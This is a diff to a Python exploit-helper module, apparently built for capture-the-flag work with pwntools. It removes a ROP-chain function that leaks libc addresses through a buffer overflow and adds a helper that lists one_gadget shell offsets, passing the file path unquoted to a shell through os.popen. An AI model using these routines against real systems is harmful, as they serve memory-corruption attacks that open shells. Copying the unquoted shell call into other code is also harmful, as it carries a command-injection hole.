@@ -1,10 +1,10 @@
 import os
 import urllib.request
+from typing import List
 
 import requests
 from bs4 import BeautifulSoup
-from pwnlib.rop import ROP
-from pwnlib.util.packing import u64
+from pwnlib.elf import ELF
 
 
 def fetch_libc_ver(addr, func="_IO_puts"):
@@ -41,15 +41,6 @@ def system_shell(libc):
     return sys, sh
 
 
-def leak_address(process, padding_length, elf, address, printer, ret):
-    padding = b"a" * (padding_length - 3) + b"LOL"
-    rop = ROP(elf)
-    rop.call(printer, (address,))
-    rop.call(ret)
-    process.sendline(padding + rop.chain())
-    while True:
-        r = process.recv()
-        if b"LOL" not in r:
-            continue
-        addr = r[-7:-1] + b"\0\0"
-        return u64(addr)
+def one_gadgets(elf: ELF) -> List[int]:
+    output = os.popen(f"one_gadget -s echo {elf.path}").readlines()
+    return [int(line) for line in output if "Try" not in line]
